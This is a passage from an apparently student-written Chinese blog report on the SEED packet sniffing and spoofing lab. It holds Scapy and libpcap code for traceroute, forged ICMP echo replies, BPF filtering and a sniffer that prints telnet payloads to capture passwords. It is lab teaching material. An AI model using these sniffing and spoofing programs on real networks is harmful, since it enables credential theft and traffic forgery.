class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>(<span class="hljs-params">destination, max_hops=<span class="hljs-number">30</span></span>):<br>    ttl = <span class="hljs-number">1</span><br>    destination_reached = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">while</span> ttl &lt;= max_hops <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> destination_reached:<br>        <span class="hljs-comment"># 构造 ICMP 请求数据包</span><br>        packet = IP(dst=destination, ttl=ttl) / ICMP()<br><br>        <span class="hljs-comment"># 发送数据包并接收响应</span><br>        reply = sr1(packet, verbose=<span class="hljs-number">0</span>, timeout=<span class="hljs-number">1</span>)<br><br>        <span class="hljs-keyword">if</span> reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-comment"># 超时，没有响应</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ttl&#125;</span>. * Timeout&quot;</span>)<br>        <span class="hljs-keyword">elif</span> reply.haslayer(IP):<br>            <span class="hljs-comment"># 获取回复的源IP地址</span><br>            source_ip = reply.getlayer(IP).src<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ttl&#125;</span>. <span class="hljs-subst">&#123;source_ip&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">if</span> source_ip == destination:<br>                destination_reached = <span class="hljs-literal">True</span><br><br>        ttl += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the final ttl=&#x27;</span>+<span class="hljs-built_in">str</span>(ttl-<span class="hljs-number">1</span>))<br><br>target_ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input an arbitrary destination IP address:&#x27;</span>)<br>traceroute(target_ip)<br></code></pre></td></tr></table></figure></li><li><p>运行结果</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813790.png"alt="image-20231115152631230" /><figcaption aria-hidden="true">image-20231115152631230</figcaption></figure></li></ol><h2 id="task-1.4-sniffing-and-then-spoofing">3.4 Task 1.4: Sniffingand-then Spoofing</h2><p>在本任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。您需要同一局域网中的两台机器：虚拟机和用户容器。从用户容器ping 一个 IP X。如果 X 还活着，ping 程序将收到一个 echo回应，并打印出回应。你的嗅探和欺骗程序运行在虚拟机上，它通过数据包嗅探监控局域网。只要看到ICMP echo 请求，无论目标 IP地址是什么，程序都应立即使用数据包欺骗技术发送 echo 回复。因此，无论机器X 是否存活，ping 程序都会收到回复，表明 X 是存活的。您需要使用 Scapy来完成这项任务。在您的报告中，您需要提供证据来证明您的技术是有效的。</p><p>在实验中，您应从用户容器 ping 以下三个 IP地址。报告您的观察结果并对结果进行解释。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722788.png"alt="image-20231213164810374" /><figcaption aria-hidden="true">image-20231213164810374</figcaption></figure><p>提示：您需要了解 ARP 协议的工作原理，才能正确解释您的观察结果。您还需要了解一些路由知识。下面的命令可以帮助你找到指定目的地的路由器：</p><p><code>ip route get 1.2.3.4</code></p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码编写：每当看到<code>ICMP echo</code>请求时，无论目标 IP地址是什么，立即使用数据包欺骗技术发送<code>ICMP reply</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reply</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 创建IP对象，交换源和目标IP地址</span><br>    response_ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)<br>    <br>    <span class="hljs-comment"># 创建ICMP对象，复制原始数据包的序列号和标识符</span><br>    response_icmp = ICMP(<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;echo-reply&#x27;</span>, code=<span class="hljs-number">0</span>, seq=pkt[ICMP].seq, <span class="hljs-built_in">id</span>=pkt[ICMP].<span class="hljs-built_in">id</span>)<br>    <br>    <span class="hljs-comment"># 打印简化的信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received ICMP from <span class="hljs-subst">&#123;pkt[IP].src&#125;</span>, responding as <span class="hljs-subst">&#123;response_ip.src&#125;</span>&quot;</span>)<br>    <br>    <br>    <span class="hljs-comment"># 构建新的数据包，包括修改后的IP和ICMP层以及原始数据包的载荷</span><br>    <span class="hljs-comment"># 在 ICMP Echo 请求和回复中，通常会包含数据，而这部分数据是原封不动地回复的，以确保整个 ICMP 数据包结构保持一致。</span><br>    response_packet = response_ip / response_icmp / pkt[Raw]<br>    <br>    <span class="hljs-comment"># 发送回复数据包</span><br>    send(response_packet)<br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获网络数据包</span><br><span class="hljs-comment"># 监听指定网络接口，仅捕获ICMP类型为echo的数据包，并调用reply函数处理每个捕获到的数据包</span><br>sniff(iface=<span class="hljs-string">&#x27;br-1efe4687329b&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;icmp[icmptype]==icmp-echo&#x27;</span>, prn=reply)<br></code></pre></td></tr></table></figure></li><li><p>运行程序</p><ul><li><p>局域网内存在的主机</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813791.png"alt="image-20231115153538655" /><figcaption aria-hidden="true">image-20231115153538655</figcaption></figure></li><li><p>局域网内不存在的主机</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813792.png"alt="image-20231115153623444" /><figcaption aria-hidden="true">image-20231115153623444</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813793.png"alt="image-20231115155220328" /><figcaption aria-hidden="true">image-20231115155220328</figcaption></figure></li><li><p>互联网上存在的主机</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813794.png"alt="image-20231115153759234" /><figcaption aria-hidden="true">image-20231115153759234</figcaption></figure></li><li><p>互联网上不存在的主机</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813795.png"alt="image-20231115153842402" /><figcaption aria-hidden="true">image-20231115153842402</figcaption></figure></li></ul></li><li><p>原因分析：容器通过虚拟交换机相连，属于交换网络。如果两台主机处于相同的子网，源主机通过ARP协议将目标主机的IP地址解析为MAC地址，然后直接将数据包发送到目标主机，如果尝试访问子网内不存在的主机，ARP表中没有相应条目，则不会发送数据包；如果两台主机不在同一个子网内，通常需要经过网关才能进行通信。源主机将使用ARP 协议查找网关的 MAC地址，并将数据包发送到网关。网关将负责将数据包转发到目标主机。（攻击机可监听所有发出的数据包）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813796.png"alt="image-20231115154222515" /><figcaption aria-hidden="true">image-20231115154222515</figcaption></figure></li></ol><h1 id="lab-task-set-2-writing-programs-to-sniff-and-spoof-packets">4.Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h1><p>对于这套任务，你应该在主机虚拟机中编译 C代码，然后在容器中运行代码。你可以使用 "docker cp"命令将文件从主机虚拟机复制到容器中。请看下面的示例（无需键入完整的docker ID）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722789.png"alt="image-20231213165451675" /><figcaption aria-hidden="true">image-20231213165451675</figcaption></figure><h2 id="task-2.1-writing-packet-sniffing-program">4.1 Task 2.1: WritingPacket Sniffing Program</h2><p>使用 <strong>pcap 库</strong>可以轻松编写嗅探器程序。有了pcap，嗅探器的任务就变成了调用 pcap库中的一系列简单程序。在序列结束时，数据包将被放入缓冲区，以便在捕获后立即进行进一步处理。捕获数据包的所有细节都由pcap 库处理。SEED 书中提供了一个示例代码，展示了如何使用 pcap编写一个简单的嗅探器程序。我们将在下文中介绍该示例代码（详细说明请参阅该书）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722790.png"alt="image-20231213165639503" /><figcaption aria-hidden="true">image-20231213165639503</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722791.png"alt="image-20231213165652007" /><figcaption aria-hidden="true">image-20231213165652007</figcaption></figure><p><strong>pcap工作流程</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813797.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="task-2.1a-understanding-how-a-sniffer-works">Task 2.1A:Understanding How a Sniffer Works</h3><p>在本任务中，学生需要编写一个嗅探器程序，以打印出每个捕获数据包的源地址和目标IP 地址。学生可键入上述代码，或从 SEED 电子书网站(https://www.handsonsecurity.net/figurecode.html)下载示例代码。学生应提供截图作为证据，以证明其嗅探器程序能够成功运行并产生预期结果。此外，请回答以下问题：</p><ul><li><p>问题1.请用自己的话描述嗅探器程序所必需的库调用顺序。这只是一个摘要，而不是像教程或书籍中那样的详细解释。</p></li><li><p>问题 2.为什么运行嗅探器程序需要 root 权限？如果程序在没有 root权限的情况下执行，会在哪里失败？</p></li><li><p>问题 3.请在您的嗅探程序中打开或关闭混杂模式。pcap open live()中第三个参数的值为 1 时，会打开混杂模式（用 0关闭）。您能演示该模式开启和关闭时的区别吗？请描述如何演示。您可以使用以下命令检查接口的混杂模式是打开还是关闭（查看promiscuity 的值）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722792.png"alt="image-20231213165924971" /><figcaption aria-hidden="true">image-20231213165924971</figcaption></figure></li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码编写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pcap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* 定义了一个打印IP地址的函数,将四个字节的IP地址以点分十进制的形式打印出来 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_ip</span><span class="hljs-params">(u_char* ipadd)</span>&#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d.%d.%d.%d&quot;</span>, ipadd[<span class="hljs-number">0</span>], ipadd[<span class="hljs-number">1</span>], ipadd[<span class="hljs-number">2</span>], ipadd[<span class="hljs-number">3</span>]);<br>&#125;<br><br><span class="hljs-comment">/* 该函数会被pcap库调用，用于处理每个捕获到的数据包 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">got_packet</span><span class="hljs-params">(u_char *args, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *header, <span class="hljs-type">const</span> u_char *packet)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">iph</span>;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n----------------Got a packet----------------\n&quot;</span>);<br>    <span class="hljs-comment">// 解析数据包中的IP头部</span><br>    iph = (<span class="hljs-keyword">struct</span> ip*)(packet + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ether_header));<br>    <br>    <span class="hljs-comment">// 打印源IP地址</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Source Ip Address:&quot;</span>);<br>    print_ip((u_char*)&amp;(iph-&gt;ip_src));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <br>    <span class="hljs-comment">// 打印目的IP地址</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Destination Ip address:&quot;</span>);<br>    print_ip((u_char*)&amp;(iph-&gt;ip_dst));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pcap_t</span> *handle;<br>    <span class="hljs-type">char</span> errbuf[PCAP_ERRBUF_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> <span class="hljs-title">fp</span>;</span><br>    <span class="hljs-comment">// char filter_exp[] = &quot;icmp&quot;; // 过滤条件2-1-A</span><br>    <span class="hljs-comment">// char filter_exp[] = &quot;icmp and host 10.9.0.5 and host 10.9.0.6&quot;; // 过滤条件2-1-B1</span><br>    <span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;tcp and dst portrange 10-100&quot;</span>; <span class="hljs-comment">// 过滤条件2-1-B2</span><br>    bpf_u_int32 net;<br>    <br>    <span class="hljs-comment">// 步骤1：打开一个网络接口,根据实际进行修改</span><br>    handle = pcap_open_live(<span class="hljs-string">&quot;br-83053c57e272&quot;</span>, BUFSIZ, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, errbuf);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">NULL</span>) &#123;<br>        perror(<span class="hljs-string">&quot;error in pcap_open_live&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 步骤2：编译过滤条件为BPF伪代码</span><br>    pcap_compile(handle, &amp;fp, filter_exp, <span class="hljs-number">0</span>, net);<br>    <span class="hljs-keyword">if</span> (pcap_setfilter(handle, &amp;fp) != <span class="hljs-number">0</span>) &#123;<br>        pcap_perror(handle, <span class="hljs-string">&quot;Error:&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 步骤3：捕获数据包并调用got_packet函数进行处理</span><br>    pcap_loop(handle, <span class="hljs-number">-1</span>, got_packet, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-comment">// 关闭pcap句柄</span><br>    pcap_close(handle);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行结果（编译命令：<code>gcc -o sniff sniff.c -lpcap</code>）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813798.png"alt="image-20231115161143174" /><figcaption aria-hidden="true">image-20231115161143174</figcaption></figure></li><li><p><strong>Question 1.</strong>嗅探器程序中库的调用顺序</p></li></ol><ul><li><code>pcap_open_live</code>：打开指定网卡设备</li><li><code>pcap_compile,pcap_setfilter</code>：编译BPF过滤条件并绑定到本次处理；</li><li><code>pcap_loop</code>：开始循环捕获，通过回调函数对捕获到的每一个包进行处理</li><li><code>pcap_close</code>：关闭本次捕获</li></ul><ol start="4" type="1"><li><p><strong>Question2.</strong>对网卡设备(底层硬件)的操作需要root权限，从第一步打开网卡就需要root权限.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813799.png"alt="image-20231115162224067" /><figcaption aria-hidden="true">image-20231115162224067</figcaption></figure></li><li><p><strong>Question3.</strong>上图为开启混杂模式，下图为关闭混杂模式(<code>pcap_open_live</code>第三个参数：1表示开启，0表示关闭)。开启混杂模式时，能捕获到局域网内和出局域网的数据包；关闭混杂模式时，只能捕获到出局域网的数据包。局域网内主机通信不需要经过网关。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813800.png"alt="image-20231115162447708" /><figcaption aria-hidden="true">image-20231115162447708</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813801.png"alt="image-20231115162507637" /><figcaption aria-hidden="true">image-20231115162507637</figcaption></figure></li></ol><h3 id="task-2.1b-writing-filters">Task 2.1B: Writing Filters</h3><p>请为您的嗅探器程序编写过滤表达式，以捕获以下各项内容。您可以在网上找到pcap过滤器的使用手册。在实验报告中，您需要包含截图，以显示应用每个过滤器后的结果。</p><ul><li>捕获两个特定主机之间的 ICMP 数据包</li><li>捕获目标端口号在 10 到 100 之间的 TCP 数据包。</li></ul><p><strong>实验流程：</strong></p><ul><li><p>捕获两个特定主机之间的ICMP数据包：<code>filter="icmp and host 10.9.0.5 and host 10.9.0.6"</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813802.png"alt="image-20231115162751885" /><figcaption aria-hidden="true">image-20231115162751885</figcaption></figure></li><li><p>捕获目标端口号在10到100范围内的TCP数据包：<code>filter="tcp and dst portrange 10-100"</code>测试用例：用curl对多个端口发起请求。三次请求中只有两次在范围内，因此捕获到了两个数据包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813803.png"alt="image-20231115162732697" /><figcaption aria-hidden="true">image-20231115162732697</figcaption></figure></li></ul><h3 id="task-2.1c-sniffing-passwords">Task 2.1C: Sniffing Passwords</h3><p>请说明如何使用您的嗅探器程序捕获有人在您监控的网络上使用 telnet时的密码。您可能需要修改嗅探器代码，以便打印出捕获的 TCP 数据包（telnet使用TCP）的数据部分。如果您打印出整个数据部分，然后手动标记密码（或部分密码）所在的位置，这样做是可以接受的。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码实现：用wireshark抓包可以得到Telnet发送的数据固定在报文第66字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pcap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><br><span class="hljs-comment">/* 该函数会被pcap库调用，用于处理每个捕获到的数据包 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">got_packet</span><span class="hljs-params">(u_char *args, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *header, <span class="hljs-type">const</span> u_char *packet)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data from byte 66: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)(packet + <span class="hljs-number">66</span>));  <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pcap_t</span> *handle;<br>    <span class="hljs-type">char</span> errbuf[PCAP_ERRBUF_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> <span class="hljs-title">fp</span>;</span><br>    <span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;tcp&quot;</span>; <span class="hljs-comment">// 过滤条件</span><br>    bpf_u_int32 net;<br>    <br>    <span class="hljs-comment">// 步骤1：打开一个网络接口</span><br>    handle = pcap_open_live(<span class="hljs-string">&quot;br-1efe4687329b&quot;</span>, BUFSIZ, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, errbuf);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">NULL</span>) &#123;<br>        perror(<span class="hljs-string">&quot;error in pcap_open_live&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 步骤2：编译过滤条件为BPF伪代码</span><br>    pcap_compile(handle, &amp;fp, filter_exp, <span class="hljs-number">0</span>, net);<br>    <span class="hljs-keyword">if</span> (pcap_setfilter(handle, &amp;fp) != <span class="hljs-number">0</span>) &#123;<br>        pcap_perror(handle, <span class="hljs-string">&quot;Error:&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 步骤3：捕获数据包并调用got_packet函数进行处理</span><br>    pcap_loop(handle, <span class="hljs-number">-1</span>, got_packet, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-comment">// 关闭pcap句柄</span><br>    pcap_close(handle);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行结果</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813804.png"alt="image-20231115165342178" /><figcaption aria-hidden="true">image-20231115165342178</figcaption></figure></li></ol><h2 id="task-2.2-spoofing">4.2 Task 2.2: Spoofing</h2><p>普通用户发送数据包时，操作系统通常不允许用户设置协议头（如 TCP、UDP和 IP头）中的所有字段。操作系统会设置大部分字段，只允许用户设置少数字段，如目标IP 地址、目标端口号等。但是，如果用户拥有 root权限，就可以在数据包报头中设置任意字段。这就是所谓的数据包欺骗，可以通过原始套接字完成。</p><p>原始套接字可让程序员绝对控制数据包的构建，允许程序员构建任意数据包，包括设置报头字段和有效载荷。使用原始套接字非常简单，包括四个步骤：(1)创建原始套接字，(2) 设置套接字选项，(3) 构建数据包，(4)通过原始套接字发送数据包。有许多在线教程可以教你如何在 C语言编程中使用原始套接字。我们已将一些教程链接到实验室的网页上。请阅读它们，学习如何编写数据包欺骗程序。我们展示了这样一个程序的简单骨架。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722793.png"alt="image-20231213170749896" /><figcaption aria-hidden="true">image-20231213170749896</figcaption></figure><p>注意事项：</p><p>你需要注意网络字节序和主机字节序的问题。如果你使用的是 x86 架构的CPU，你的主机字节序是小端字节序，而网络字节序是大端字节序。无论你将什么样的数据放入数据包缓冲区中，都必须使用网络字节序；如果你不这样做，你的数据包将不正确。实际上，你不需要担心你的机器使用哪种字节序，而且如果你希望你的程序具有可移植性，实际上也不应该担心。</p><p>你需要做的是始终记得在将数据放入缓冲区时将其转换为网络字节序，而在从缓冲区复制数据到计算机上的数据结构时将其转换为主机字节序。如果数据是单个字节，你不需要担心字节序的问题，但如果数据是short、int、long或由多个字节组成的数据类型，你需要调用以下其中一个函数来进行数据转换：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">htonl</span><span class="hljs-params">()</span></span>：将无符号整数从主机字节序转换为网络字节序。<br><span class="hljs-function"><span class="hljs-title">ntohl</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">htonl</span>()的反向操作，将无符号整数从网络字节序转换为主机字节序。<br><span class="hljs-function"><span class="hljs-title">htons</span><span class="hljs-params">()</span></span>：将无符号短整数从主机字节序转换为网络字节序。<br><span class="hljs-function"><span class="hljs-title">ntohs</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">htons</span>()的反向操作，将无符号短整数从网络字节序转换为主机字节序。<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">inet_addr</span><span class="hljs-params">()</span></span> 函数：将点分十进制形式的 IPv4 地址字符串转换为 <span class="hljs-number">32</span> 位整数，返回网络字节序的表示<br><span class="hljs-function"><span class="hljs-title">inet_network</span><span class="hljs-params">()</span></span> 函数：与 <span class="hljs-built_in">inet_addr</span>() 类似，将点分十进制形式的 IPv4 地址字符串转换为 <span class="hljs-number">32</span> 位整数，返回网络字节序的表示<br><span class="hljs-function"><span class="hljs-title">inet_ntoa</span><span class="hljs-params">()</span></span> 函数：将网络字节序的 <span class="hljs-number">32</span> 位整数表示的 IPv4 地址转换为点分十进制形式的字符串<br><span class="hljs-function"><span class="hljs-title">inet_aton</span><span class="hljs-params">()</span></span> 函数：将点分十进制形式的 IPv4 地址字符串转换为网络字节序的 <span class="hljs-number">32</span> 位整数，并存储在指定的 struct in_addr 结构体中<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 